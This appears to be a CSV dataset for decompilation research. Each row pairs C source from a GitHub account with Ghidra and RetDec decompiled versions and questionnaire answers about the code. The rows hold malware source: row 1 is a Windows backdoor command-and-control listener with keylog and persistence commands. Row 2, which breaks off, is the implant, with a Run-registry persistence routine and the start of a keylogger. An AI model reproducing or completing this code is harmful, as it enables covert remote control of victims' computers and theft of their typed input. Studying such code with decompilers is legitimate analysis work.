id,source,Complilation ,Platform,original_code,Function_names,Variable_names,Comments,decompiled_Ghidra,decompiled_RetDec,original_questionnaire,decompiled_Ghidra_questionnairex,decompiled_RetDec_questionnaire
1,https://github.com/jamiekariuki,Done,Windows,"#include <stdio.h>
#include <sys/types.h>
//#include <sys/socket.h>
//#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
//#include <unistd.h>
//#include <arp/inet.h>
#include <stdio.h>
#include <stdlib.h>
//#include <Unistd.h>
#include <WinSock2.h>
#include <Windows.h>
#include <WinUser.h>
#include <WinInet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
//main function to creat connection/listenning for incomming connection and to send command and recieve response
int main()
{
int sock;
int client_socket; //we need clients socket because we are the server, we need our own socket and once the client intitiate the connection to us we also need to store the client socket
char buffer[1024]; // to transfer the commands
char response[18384];
struct sockaddr_in server_address, client_address;
int i=0;
int optval= 1;
int client_length;
sock= socket(AF_INET, SOCK_STREAM, 0);
//setting socket options
//if statment in order to check whether our setting or socket object worked, if it didnt we close the program
if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) < 0)
{
printf(""error setting TCP socket options!\n"");
return 1;
}
const char* ServIP= ""192.168.12.345"" ; //change this to your ip
unsigned short ServPort= 50005;
//defining all diffrent parameters for serAddr because it is a part of a structure stock adress
server_address.sin_family= AF_INET;//ipv4 coonection
server_address.sin_addr.s_addr = inet_addr(ServIP); // inet_addr converts string ip adress to an ip adress format
server_address.sin_port= htons(ServPort); // htons convert int port to port format
bind(sock, (struct sockaddr*) &server_address, sizeof(server_address)); //binding server ip and server port
listen(sock, 5); //listening to the incoming connection sock is the socket we are listening and 5 is the amount of connection we want to accept
client_length= sizeof(client_address);
client_socket= accept(sock, (struct sockaddr*) &client_address, &client_length); //accepting connection request, accept function returns the client socket, we store it in client socket that we will use to communicate with the client
//where we will send the commands
while(1)
{
jump: //jumpig here whener we want. //bzero is not define here because it exist in linux
memset(buffer, 0, 1024); // converting the variable to 0s
memset(response, 0, sizeof(response)); //its going to store the response that the backdoor sends to us, so we want to clear it every time
//we need to prompt the user of this server to input a command to send to the target, example... we creat a connection with the client system and we manage to hack the windows 10 machine
//if we want to see all the files in the desktop dirrectory on the client/target machine; we would need to input somewhere their command and then their commans would be sent to the backdoor
//and backdoor would execute that their command in its terminal and then it will gather all the response from that which is going to be the output of the directories on the desktop directory
//and then it will send that respond as a string back to us and then we would print it right here on our screen
printf(""* Shell#%s~$: "", inet_ntoa(client_address.sin_addr)); //inet_ntoa will input clients ip by taking the above argument(ip adress)
//once we print that we wait the user of the server to input a command and we need to store it somewhere, so we are going to store it in our buffer
//fgets function will get the string and store it as a first argument which we want to be a buffer so it will store it inside the buffer, the second argument will be the size of the buffer
fgets(buffer, sizeof(buffer), stdin);
strtok(buffer, ""\n""); //removing /n from command lines
//sending commands to the target
send(client_socket, buffer, sizeof(buffer), 0);
if (strncmp(""q"", buffer, 1) == 0)
{
break;
}
else if(strncmp(""cd "", buffer,3)==0)
{
goto jump;
}
else if(strncmp(""keylog_start"", buffer,3)==0)
{
goto jump;
}
else if(strncmp(""persist"", buffer, 7) == 0)
{
recv(client_socket, response, sizeof(response),0);
printf(""%s"", response);
}
else
{
recv(client_socket, response, sizeof(response), 0);
printf(""%s"", response);
}
}
}","{
""functions"": [
""main"",
""inet_addr"",
""bind"",
""listen"",
""accept"",
""memset"",
""printf"",
""fgets"",
""strtok"",
""send"",
""strncmp"",
""recv""
]
}","{
""variables"": [
""sock"",
""client_socket"",
""buffer"",
""response"",
""server_address"",
""client_address"",
""i"",
""optval"",
""client_length"",
""ServIP"",
""ServPort""
]
}","""//#include <sys/socket.h>"",
""//#include <netinet/in.h>"",
""//#include <unistd.h>"",
""//#include <arp/inet.h>"",
""//#include <Unistd.h>"",
""//main function to creat connection/listenning for incomming connection and to send command and recieve response"",
""//we need clients socket because we are the server, we need our own socket and once the client intitiate the connection to us we also need to store the client socket"",
""// to transfer the commands"",
""//setting socket options"",
""//if statment in order to check whether our setting or socket object worked, if it didnt we close the program"",
""//change this to your ip"",
""//defining all diffrent parameters for serAddr because it is a part of a structure stock adress"",
""//ipv4 coonection"",
""// inet_addr converts string ip adress to an ip adress format"",
""// htons convert int port to port format"",
""//binding server ip and server port"",
""//listening to the incoming connection sock is the socket we are listening and 5 is the amount of connection we want to accept"",
""//accepting connection request, accept function returns the client socket, we store it in client socket that we will use to communicate with the client"",
""//where we will send the commands"",
""//jumpig here whener we want. //bzero is not define here because it exist in linux"",
""// converting the variable to 0s"",
""//its going to store the response that the backdoor sends to us, so we want to clear it every time"",
""//inet_ntoa will input clients ip by taking the above argument(ip adress)"",
""//once we print that we wait the user of the server to input a command and we need to store it somewhere, so we are going to store it in our buffer"",
""//fgets function will get the string and store it as a first argument which we want to be a buffer so it will store it inside the buffer, the second argument will be the size of the buffer"",
""//removing /n from command lines"",
""//sending commands to the target‚Äù","int __cdecl _main(int _Argc,char **_Argv,char **_Env);
int _bind@12(SOCKET s,sockaddr *addr,int namelen);
ulong _inet_addr@4(char *cp);
SOCKET _socket@12(int af,int type,int protocol);
SOCKET _accept@12(SOCKET s,sockaddr *addr,int *addrlen);
int _setsockopt@20(SOCKET s,int level,int optname,char *optval,int optlen);
int _listen@8(SOCKET s,int backlog);
int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount);
int _send@16(SOCKET s,char *buf,int len,int flags);
char * __cdecl _strtok(char *_Str,char *_Delim);
int __cdecl _puts(char *_Str);
char * _inet_ntoa@4(in_addr in);
char * __cdecl _fgets(char *_Buf,int _MaxCount,FILE *_File);
u_short _htons@4(u_short hostshort);
int _recv@16(SOCKET s,char buf,int len,int flags);
/ WARNING: Unable to track spacebase fully for stack */
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
uint uVar1;
int iVar2;
int iVar3;
char *pcVar4;
undefined4 local_4c1c;
undefined4 local_4c18;
undefined local_4c14 [4];
undefined4 local_4c10;
undefined2 local_4c04;
u_short local_4c02;
ulong local_4c00;
undefined local_4bf4 [18384];
char local_424 [1024];
SOCKET local_24;
ushort local_1e;
char *local_1c;
SOCKET local_18;
undefined4 local_14;
FILE *pFStack_10;
pFStack_10 = (FILE *)0x401478;
uVar1 = ___chkstk_ms((char)&_Argc);
iVar3 = -uVar1;
*(undefined4 *)((int)&pFStack_10 + iVar3) = 0x40147f;
___main();
local_14 = 0;
local_4c18 = 1;
*(undefined4 *)(&stack0xfffffffc + iVar3) = 0;
*(undefined4 *)(&stack0xfffffff8 + iVar3) = 1;
*(undefined4 *)(&stack0xfffffff4 + iVar3) = 2;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x4014ac;
local_18 = _socket_12((int )(&stack0xfffffff4 + iVar3),(int *)(&stack0xfffffff8 + iVar3),
*(int *)(&stack0xfffffffc + iVar3));
*(undefined4 *)((int)&_Argc + iVar3) = 4;
*(undefined4 **)(&stack0x00000000 + iVar3) = &local_4c18;
*(undefined4 *)(&stack0xfffffffc + iVar3) = 4;
*(undefined4 *)(&stack0xfffffff8 + iVar3) = 0xffff;
*(SOCKET *)(&stack0xfffffff4 + iVar3) = local_18;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x4014df;
iVar2 = _setsockopt_20((SOCKET )(&stack0xfffffff4 + iVar3),(int *)(&stack0xfffffff8 + iVar3),
*(int )(&stack0xfffffffc + iVar3),(char **)(&stack0x00000000 + iVar3),
*(int *)((int)&_Argc + iVar3));
if (iVar2 < 0) {
*(char **)(&stack0xfffffff4 + iVar3) = ""error setting TCP socket options!"";
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x4014f2;
_puts((char **)(&stack0xfffffff4 + iVar3));
iVar3 = 1;
}
else {
local_1c = ""192.168.12.345"";
local_1e = 0xc355;
local_4c04 = 2;
*(char **)(&stack0xfffffff4 + iVar3) = ""192.168.12.345"";
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x40151d;
local_4c00 = _inet_addr_4((char **)(&stack0xfffffff4 + iVar3));
*(uint *)(&stack0xfffffff4 + iVar3) = (uint)local_1e;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x401532;
local_4c02 = _htons_4((u_short *)(&stack0xfffffff4 + iVar3));
*(undefined4 *)(&stack0xfffffffc + iVar3) = 0x10;
*(undefined2 **)(&stack0xfffffff8 + iVar3) = &local_4c04;
*(SOCKET *)(&stack0xfffffff4 + iVar3) = local_18;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x401559;
_bind_12((SOCKET )(&stack0xfffffff4 + iVar3),(sockaddr **)(&stack0xfffffff8 + iVar3),
*(int *)(&stack0xfffffffc + iVar3));
*(undefined4 *)(&stack0xfffffff8 + iVar3) = 5;
*(SOCKET *)(&stack0xfffffff4 + iVar3) = local_18;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x40156f;
_listen_8((SOCKET )(&stack0xfffffff4 + iVar3),(int *)(&stack0xfffffff8 + iVar3));
local_4c1c = 0x10;
*(undefined4 **)(&stack0xfffffffc + iVar3) = &local_4c1c;
*(undefined **)(&stack0xfffffff8 + iVar3) = local_4c14;
*(SOCKET *)(&stack0xfffffff4 + iVar3) = local_18;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x40159b;
local_24 = _accept_12((SOCKET *)(&stack0xfffffff4 + iVar3),
*(sockaddr **)(&stack0xfffffff8 + iVar3),
*(int **)(&stack0xfffffffc + iVar3));
while( true ) {
*(undefined4 *)(&stack0xfffffffc + iVar3) = 0x400;
*(undefined4 *)(&stack0xfffffff8 + iVar3) = 0;
*(char **)(&stack0xfffffff4 + iVar3) = local_424;
(undefined4 )((int)&pFStack_10 + iVar3) = 0x4015bf;
_memset((void **)(&stack0xfffffff4 + iVar3),(int *)(&stack0xfffffff8 + iVar3),
*(size_t *)(&stack0xfffffffc + iVar3));
*(undefined4 *)(&stack0xfffffffc + iVar3) = 0x47d0;
*(undefined4 *)(&stack0xfffffff8 + iVar3) = 0;
*(undefined **)(&stack0xfffffff4 + iVar3) = local_4bf4;
(undefined4 )((int)&pFStack_10 + iVar3) = 0x4015dd;
_memset((void **)(&stack0xfffffff4 + iVar3),(int *)(&stack0xfffffff8 + iVar3),
*(size_t *)(&stack0xfffffffc + iVar3));
*(undefined4 *)(&stack0xfffffff4 + iVar3) = local_4c10;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x4015eb;
pcVar4 = _inet_ntoa_4((in_addr)(_union_1226 *)
&((_union_1226 *)(&stack0xfffffff4 + iVar3))->S_un_b);
*(char **)(&stack0xfffffff8 + iVar3) = pcVar4;
*(char *)(&stack0xfffffff4 + iVar3) = "" Shell#%s~$: "";
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x4015fe;
_printf((char **)(&stack0xfffffff4 + iVar3));
*(code **)(&stack0xfffffffc + iVar3) = _iob_exref;
*(undefined4 *)(&stack0xfffffff8 + iVar3) = 0x400;
*(char **)(&stack0xfffffff4 + iVar3) = local_424;
(undefined4 )((int)&pFStack_10 + iVar3) = 0x40161d;
_fgets((char **)(&stack0xfffffff4 + iVar3),(int *)(&stack0xfffffff8 + iVar3),
*(FILE **)(&stack0xfffffffc + iVar3));
*(undefined **)(&stack0xfffffff8 + iVar3) = &DAT_004050a4;
*(char **)(&stack0xfffffff4 + iVar3) = local_424;
(undefined4 )((int)&pFStack_10 + iVar3) = 0x401633;
_strtok((char **)(&stack0xfffffff4 + iVar3),(char **)(&stack0xfffffff8 + iVar3));
*(undefined4 *)(&stack0x00000000 + iVar3) = 0;
*(undefined4 *)(&stack0xfffffffc + iVar3) = 0x400;
*(char **)(&stack0xfffffff8 + iVar3) = local_424;
*(SOCKET *)(&stack0xfffffff4 + iVar3) = local_24;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x401658;
_send_16((SOCKET )(&stack0xfffffff4 + iVar3),(char **)(&stack0xfffffff8 + iVar3),
*(int )(&stack0xfffffffc + iVar3),(int *)(&stack0x00000000 + iVar3));
if (local_424[0] == 'q') break;
*(undefined4 *)(&stack0xfffffffc + iVar3) = 3;
*(char **)(&stack0xfffffff8 + iVar3) = local_424;
*(undefined **)(&stack0xfffffff4 + iVar3) = &DAT_004050a8;
(undefined4 )((int)&pFStack_10 + iVar3) = 0x401692;
iVar2 = _strncmp((char **)(&stack0xfffffff4 + iVar3),(char **)(&stack0xfffffff8 + iVar3),
*(size_t *)(&stack0xfffffffc + iVar3));
if (iVar2 != 0) {
*(undefined4 *)(&stack0xfffffffc + iVar3) = 3;
*(char **)(&stack0xfffffff8 + iVar3) = local_424;
*(char **)(&stack0xfffffff4 + iVar3) = ""keylog_start"";
(undefined4 )((int)&pFStack_10 + iVar3) = 0x4016b9;
iVar2 = _strncmp((char **)(&stack0xfffffff4 + iVar3),(char **)(&stack0xfffffff8 + iVar3),
*(size_t *)(&stack0xfffffffc + iVar3));
if (iVar2 != 0) {
*(undefined4 *)(&stack0xfffffffc + iVar3) = 7;
*(char **)(&stack0xfffffff8 + iVar3) = local_424;
(char **)(&stack0xfffffff4 + iVar3) = ""persist"";
(undefined4 )((int)&pFStack_10 + iVar3) = 0x4016e0;
iVar2 = _strncmp((char **)(&stack0xfffffff4 + iVar3),(char **)(&stack0xfffffff8 + iVar3)
,(size_t *)(&stack0xfffffffc + iVar3));
if (iVar2 == 0) {
*(undefined4 *)(&stack0x00000000 + iVar3) = 0;
*(undefined4 *)(&stack0xfffffffc + iVar3) = 0x47d0;
*(undefined **)(&stack0xfffffff8 + iVar3) = local_4bf4;
*(SOCKET *)(&stack0xfffffff4 + iVar3) = local_24;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x401709;
_recv_16((SOCKET )(&stack0xfffffff4 + iVar3),(char **)(&stack0xfffffff8 + iVar3),
*(int )(&stack0xfffffffc + iVar3),(int *)(&stack0x00000000 + iVar3));
*(undefined **)(&stack0xfffffff8 + iVar3) = local_4bf4;
*(undefined **)(&stack0xfffffff4 + iVar3) = &DAT_004050c1;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x401722;
_printf((char **)(&stack0xfffffff4 + iVar3));
}
else {
*(undefined4 *)(&stack0x00000000 + iVar3) = 0;
*(undefined4 *)(&stack0xfffffffc + iVar3) = 0x47d0;
*(undefined **)(&stack0xfffffff8 + iVar3) = local_4bf4;
*(SOCKET *)(&stack0xfffffff4 + iVar3) = local_24;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x40174c;
_recv_16((SOCKET )(&stack0xfffffff4 + iVar3),(char **)(&stack0xfffffff8 + iVar3),
*(int )(&stack0xfffffffc + iVar3),(int *)(&stack0x00000000 + iVar3));
*(undefined **)(&stack0xfffffff8 + iVar3) = local_4bf4;
*(undefined **)(&stack0xfffffff4 + iVar3) = &DAT_004050c1;
*(undefined4 )((int)&pFStack_10 + iVar3) = 0x401765;
_printf((char **)(&stack0xfffffff4 + iVar3));
}
}
}
}
iVar3 = 0;
}
return iVar3;
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
// ------------------------ Structures ------------------------
struct _IO_FILE {
int32_t e0;
};
struct sockaddr {
int16_t e0;
char e1[14];
};
// ------------------- Function Prototypes --------------------
int32_t ___chkstk_ms(void);
int32_t ___do_global_ctors(void);
int32_t ___main(void);
// --------------------- Global Variables ---------------------
int32_t g1 = -1; // 0x403f00
int32_t g2 = 0x71000a; // 0x4050a4
int32_t g3 = 0; // 0x407028
int32_t g4;
// ------------------------ Functions -------------------------
// Address range: 0x401460 - 0x401778
int main(int argc, char ** argv) {
// 0x401460
int32_t v1; // 0x401460
int32_t v2 = &v1; // bp-12, 0x40146d
int32_t v3 = (int32_t)&v2 - ___chkstk_ms(); // 0x401478
___main();
int32_t domain = 1; // bp-19480, 0x401486
*(int32_t *)(v3 + 8) = 0;
int32_t * v4 = (int32_t *)(v3 + 4); // 0x401498
*v4 = 1;
int32_t * v5 = (int32_t *)v3; // 0x4014a0
*v5 = 2;
int32_t sock_fd = socket(domain, (int32_t)&g4, (int32_t)&g4); // 0x4014a7
*v4 = 4;
*v5 = (int32_t)&domain;
*(int32_t *)(v3 - 4) = 4;
*(int32_t *)(v3 - 8) = 0xffff;
*(int32_t *)(v3 - 12) = sock_fd;
int32_t v6 = setsockopt((int32_t)&g4, (int32_t)&g4, (int32_t)&g4, (char *)&g4, (int32_t)&g4); // 0x4014da
int32_t v7 = v3 - 32; // 0x4014df
if (v6 < 0) {
// 0x4014e6
*(int32_t *)v7 = (int32_t)""error setting TCP socket options!"";
puts((char *)&g4);
// 0x401770
return 1;
}
char * cp = (char *)2; // bp-19460, 0x401509
int32_t * v8 = (int32_t *)v7; // 0x401515
*v8 = (int32_t)""192.168.12.345"";
int32_t host_short = inet_addr(cp); // 0x401518
int32_t * v9 = (int32_t *)(v3 - 36); // 0x40152a
*v9 = 0xc355;
int16_t sock = htons((int16_t)host_short); // 0x40152d
*v8 = 16;
*v9 = (int32_t)&cp;
*(int32_t *)(v3 - 40) = sock_fd;
bind((int32_t)sock, (struct sockaddr *)&g4, (int32_t)&g4);
*(int32_t *)(v3 - 48) = 5;
int32_t * v10 = (int32_t *)(v3 - 52); // 0x401567
*v10 = sock_fd;
listen((int32_t)&g4, (int32_t)&g4);
int32_t sock2 = 16; // bp-19484, 0x401572
*v10 = (int32_t)&sock2;
int32_t v11; // bp-19476, 0x401460
*(int32_t *)(v3 - 56) = (int32_t)&v11;
*(int32_t *)(v3 - 60) = sock_fd;
int32_t accepted_sock_fd = accept(sock2, (struct sockaddr *)&g4, &g4); // 0x401596
int32_t v12; // bp-1060, 0x401460
int32_t v13 = &v12; // 0x4015b7
int32_t v14; // bp-19444, 0x401460
int32_t v15 = &v14;
int32_t v16 = v3 - 72;
int32_t * v17 = (int32_t *)(v16 + 8); // 0x4015a1
*v17 = 1024;
int32_t * v18 = (int32_t *)(v16 + 4); // 0x4015a9
*v18 = 0;
int32_t * v19 = (int32_t *)v16; // 0x4015b7
*v19 = v13;
memset(&g4, (int32_t)&g4, (int32_t)&g4);
*v17 = 0x47d0;
*v18 = 0;
*v19 = v15;
memset(&g4, (int32_t)&g4, (int32_t)&g4);
*v19 = (int32_t)inet_ntoa((struct {int32_t e0;}){
.e0 = (int32_t)&g4
});
int32_t * v20 = (int32_t *)(v16 - 4); // 0x4015f2
v20 = (int32_t)"" Shell#%s~$: "";
printf((char *)&g4);
*v18 = *(int32_t *)0x4081f8;
*v19 = 1024;
*v20 = v13;
fgets((char *)&g4, (int32_t)&g4, (struct _IO_FILE *)&g4);
*v19 = (int32_t)&g2;
*v20 = v13;
strtok((char *)&g4, (char *)&g4);
*v17 = 0;
*v18 = 1024;
*v19 = v13;
*v20 = accepted_sock_fd;
send((int32_t)&g4, (char *)&g4, (int32_t)&g4, (int32_t)&g4);
while ((char)v12 != 113) {
int32_t v21 = v16 - 20; // 0x401658
int32_t * v22 = (int32_t *)(v16 - 12); // 0x401674
*v22 = 3;
int32_t * v23 = (int32_t *)(v16 - 16); // 0x401682
*v23 = v13;
int32_t * v24 = (int32_t *)v21; // 0x401686
*v24 = (int32_t)""cd "";
int32_t strncmp_rc = strncmp((char *)&g4, (char *)&g4, (int32_t)&g4); // 0x40168d
int32_t v25 = v21; // 0x401694
if (strncmp_rc != 0) {
// 0x40169b
*v22 = 3;
*v23 = v13;
*v24 = (int32_t)""keylog_start"";
int32_t strncmp_rc2 = strncmp((char *)&g4, (char *)&g4, (int32_t)&g4); // 0x4016b4
v25 = v21;
if (strncmp_rc2 != 0) {
// 0x4016c2
*v22 = 7;
*v23 = v13;
*v24 = (int32_t)""persist"";
strncmp((char *)&g4, (char *)&g4, (int32_t)&g4);
*(int32_t *)(v16 - 8) = 0;
*v22 = 0x47d0;
*v23 = v15;
*v24 = accepted_sock_fd;
recv((int32_t)&g4, (char *)&g4, (int32_t)&g4, (int32_t)&g4);
int32_t v26 = v16 - 36;
*(int32_t *)(v16 - 32) = v15;
*(int32_t *)v26 = (int32_t)""%s"";
printf((char *)&g4);
v25 = v26;
}
}
v16 = v25;
v17 = (int32_t *)(v16 + 8);
*v17 = 1024;
v18 = (int32_t *)(v16 + 4);
*v18 = 0;
v19 = (int32_t *)v16;
*v19 = v13;
memset(&g4, (int32_t)&g4, (int32_t)&g4);
*v17 = 0x47d0;
*v18 = 0;
*v19 = v15;
memset(&g4, (int32_t)&g4, (int32_t)&g4);
*v19 = (int32_t)inet_ntoa((struct {int32_t e0;}){
.e0 = (int32_t)&g4
});
v20 = (int32_t *)(v16 - 4);
v20 = (int32_t)"" Shell#%s~$: "";
printf((char *)&g4);
*v18 = *(int32_t *)0x4081f8;
*v19 = 1024;
*v20 = v13;
fgets((char *)&g4, (int32_t)&g4, (struct _IO_FILE *)&g4);
*v19 = (int32_t)&g2;
*v20 = v13;
strtok((char *)&g4, (char *)&g4);
*v17 = 0;
*v18 = 1024;
*v19 = v13;
v20 = accepted_sock_fd;
send((int32_t)&g4, (char )&g4, (int32_t)&g4, (int32_t)&g4);
}
// 0x401770
return 0;
}
// Address range: 0x401cb0 - 0x401cf6
int32_t ___do_global_ctors(void) {
int32_t v1 = 0;
int32_t v2 = v1 + 1; // 0x401ce6
while ((int32_t )(4 * v2 + (int32_t)&g1) != 0) {
// 0x401ce6
v1 = v2;
v2 = v1 + 1;
}
// 0x401cf4
if (v1 == 0) {
// 0x401ccf
return atexit((void ()())0x401c80);
}
int32_t v3 = v1; // 0x401cc1
while (v3 != 1) {
// 0x401cc3
v3--;
}
// 0x401ccf
return atexit((void ()())0x401c80);
}
// Address range: 0x401d00 - 0x401d1c
int32_t ___main(void) {
int32_t result = g3; // 0x401d00
if (result != 0) {
// 0x401d09
return result;
}
// 0x401d10
g3 = 1;
return ___do_global_ctors();
}
// Address range: 0x402350 - 0x40237a
int32_t ___chkstk_ms(void) {
// 0x402350
int32_t result; // 0x402350
return result;
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (6.3.0)
// Detected functions: 4","1. The primary functionality of the code is to create a server that listens for incoming connections, accepts commands from a client, executes them, and sends command responses back to the client. It is a basic command-and-control mechanism for a server to interact with a client, potentially for remote administration or exploitation purposes.

2. Three key functions:
- `socket()`: Initializes a new socket for communication.
- `bind()`: Associates the server's socket with a specific port and IP address so it can listen for incoming requests.
- `accept()`: Waits for and accepts an incoming connection request, returning a new client socket for communication with the connected client.

3. `client_socket`: This variable represents a socket for the client that connects to the server. It is used for communication between the client and the server‚Äîsending commands to and receiving responses from the client.

4. The error handling mechanism is minimal. It consists of a check after `setsockopt()` which prints an error message and returns with code 1 if setting the socket options fails. Other potential errors (e.g., failing `bind()`, `listen()`, or `accept()` calls) are not handled and could lead to undefined behavior.

5. Flow of execution after accepting a connection:
- The server enters an infinite loop where it continuously prompts the user to input commands.
- It reads a command into the buffer with `fgets()`.
- It sends the command via `send()` to the client.
- If specific commands (`q`, `cd`, or `keylog_start`) are received it performs respective branching; if `persist` is received, it awaits and prints a response.
- For other commands, it receives and prints the response from the client.

6. External libraries or dependencies:
- Standard libraries: `<stdio.h>`, `<stdlib.h>`, `<string.h>`, `<sys/types.h>`.
- Windows-specific libraries: `<WinSock2.h>`, `<Windows.h>`, `<WinUser.h>`, `<WinInet.h>`, `<windowsx.h>`.
- Libraries that are commented out and not used: `<sys/socket.h>`, `<netinet/in.h>`, `<arpa/inet.h>`, `<unistd.h>`.

7. Security concerns evident in the code:
- The IP address is hardcoded, which could be a potential security risk if the code is disclosed.
- Lack of proper input validation for commands might allow for buffer overflow attacks or other forms of exploitation.
- The absence of encryption means that the transmitted data, potentially sensitive commands and responses, are vulnerable to interception.
- The server appears to allow remote command execution without authentication, presenting a significant security risk.
- Error handling is rudimentary; many functions lack checks that could lead to crashes or unintended behavior on failure.","1. The primary functionality of the code appears to be that of a simple TCP server, which binds to an address, listens for incoming connections, accepts a client, and then interacts with the client by reading input, processing commands, and sending responses until the client disconnects or sends a specific command.

2. Key Functions:
   - `_socket@12()`: Creates a new socket for network communication.
   - `_bind@12()`: Binds the created socket to a specific port and IP address for the server to listen on.
   - `_accept@12()`: Waits for a client to connect to the server and accepts the connection to start communication.

3. The role of `local_24`: This variable seems to be a `SOCKET` type and is likely being used to store the value of the accepted client socket, which is returned from `_accept@12` method.

4. The error handling mechanism involves checking the return values of functions like `socket`, `setsockopt`, and others to determine if they executed successfully. If these functions return a negative value, an error message is printed using `_puts` and the program may exit or continue based on the logic.

5. Flow of execution in accepting a connection:
   - The server socket `local_18` is created and configured.
   - It is bound to an IP and port, then set to listen.
   - `_accept@12` waits for an incoming connection.
   - Upon a successful connection, it returns a new socket `local_24` for communication with the client.

6. External Libraries/Dependencies:
   - Standard C libraries (stdio.h for `FILE`, strings.h for string functions).
   - Winsock library for socket functions (`SOCKET`, `sockaddr`, etc.).
   - Platform-specific functions prefixed with underscores (`_`) suggest it's likely compiled with Microsoft Visual C/C++ or similar for Windows.

7. Evident Security Concerns:
   - The IP address is hardcoded, which is not flexible and could be a potential target for attacks.
   - Lack of bounds checking on received data could lead to buffer overflow vulnerabilities.
   - The command 'keylog_start' suggests possible malicious intent or the inclusion of a keylogging function.
   - Unencrypted data transmission over network sockets could be susceptible to eavesdropping or man-in-the-middle attacks.","1. The primary functionality of this code is to create a network server that listens for incoming TCP connections. On receiving a command, the server processes it, potentially performing actions for specific commands such as ""cd"" or ""keylog_start,"" and sends a response back to the client.

2. Three key functions are:
   - `socket()`: creates a socket that is used for network communication.
   - `bind()`: associates the created socket with a specific local address and port number for incoming connections.
   - `accept()`: waits for an incoming connection and establishes the connection once received.

3. The `g4` variable is used as a generic placeholder in numerous function calls for arguments. Considering its widespread use and limited context, understanding its exact role is difficult, but it is likely meant as a buffer for network data or a sockaddr structure.

4. The error handling mechanism is rudimentary; it checks the return value of certain system calls (e.g., `setsockopt()`) and prints an error message followed by returning `1` to indicate failure if the system call fails.

5. The flow of execution in the section where the server listens and accepts connections:
   - The `listen()` function sets the socket to listen for incoming connections.
   - The `accept()` function is called, blocking until a connection is made.
   - Upon a successful connection, the server enters a loop where it reads, processes commands, and sends responses.

6. External libraries or dependencies include standard networking headers such as `sys/socket.h`, `netinet/in.h`, `arpa/inet.h`, and the standard input-output header `stdio.h`.

7. Evident security concerns:
   - Fixed-size buffers and use of functions like `strtok()` and `printf()` can lead to buffer overflow vulnerabilities.
   - Lack of validation for incoming data might lead to arbitrary code execution.
   - Hardcoded values and use of magic numbers suggest a lack of configurability and possible understanding of the code, making maintenance difficult.
   - Incomplete error handling may not cover all possible error cases, leading to unexpected behavior.
   - The server doesn't appear to authenticate clients, which could allow unauthorized access."
2,https://github.com/jamiekariuki,Done,Windows,"#include <stdio.h>
#include <stdlib.h>
//#include <unistd.h>
#include <WinSock2.h>
#include <Windows.h>
#include <WinUser.h>
#include <WinInet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <direct.h>
#define ERROR_SUCCESS 0
#define bzero(p, size) (void) memset((p), 0, (size)) //clowning memset function to bzero
int sock;
//changing directory function
char *
str_cut(char str[], int slice_from, int slice_to)
{
if(str[0] == '\0') return NULL;
char* buffer;
size_t str_len, buffer_len;
if(slice_to < 0 && slice_from > slice_to)
{
str_len = strlen(str);
if(abs(slice_to) > str_len - 1) return NULL;
if(abs(slice_from) > str_len ) slice_from= (-1) * str_len;
buffer_len= slice_to - slice_from;
str += (str_len + slice_from);
}
else if (slice_from >= 0 && slice_to > slice_from)
{
str_len= strlen(str);
if(slice_from > str_len - 1) return NULL;
buffer_len= slice_to - slice_from;
str += slice_from;
}
else
{
return NULL;
}
buffer = calloc(buffer_len, sizeof(char));
strncpy(buffer, str, buffer_len);
return buffer;
}
//persistance function
int bootRun()
{
char err[128]= ""failed\n"";
char suc[128]= ""Created Pesistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"";
TCHAR szPath[MAX_PATH]; //store path and get path to our own malware
DWORD pathLen= 0;
//retrives fully qualified path for the file that contains th specified module (we are geting the path to our malware)
pathLen= GetModuleFileName(NULL, szPath, MAX_PATH);
if(pathLen == 0)
{
send(sock, err, sizeof(err), 0);
return -1;
}
HKEY NewVal;
//OPENS SPECIFIED REGISTRY AND it will try to add the new value to it
if(RegOpenKey(HKEY_CURRENT_USER, TEXT(""Software\\Microsoft\\Windows\\CurrentVersion\\Run""), &NewVal) != ERROR_SUCCESS)
{
send(sock, err, sizeof(err), 0);
return -1;
}
DWORD pathLenInBytes= pathLen * sizeof(szPath);
if(RegSetValueEx(NewVal, TEXT(""Hacked""), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
{
RegCloseKey(NewVal);
send(sock, err,sizeof(err), 0);
return -1;
}
RegCloseKey(NewVal);
send(sock, suc, sizeof(suc), 0);
return 0;
}
//keyloger function
DWORD WINAPI logg()
{
int vkey, last_key_state[0xFF];
int isCAPSLOCK, isNUMLOCK;
int isL_SHIFT, isR_SHIFT;
int isPressed;
char showKey;
char NUMCHAR[]= "")!@#$%^&("";
char chars_vn[]="";=,-./`"";
char chars_vs[]= "":+<_>?~"";
char chars_va[]=""[\\]\';"";
char chars_vb[]=""{|}\"""";
FILE kh;
char KEY_LOG_FILE[]=""windows.txt"";
//: making last key state 0
for(vkey=0; vkey<0xFF; vkey++)
{
last_key_state[vkey]= 0;
}
//: running infinite
while(1)
{
//: take rest for 10 ms
Sleep(10);
// get key state of CAPSLOCK, NUMCLOCK
// and LEFT_SHIFT/ RIGHT_SHIFT
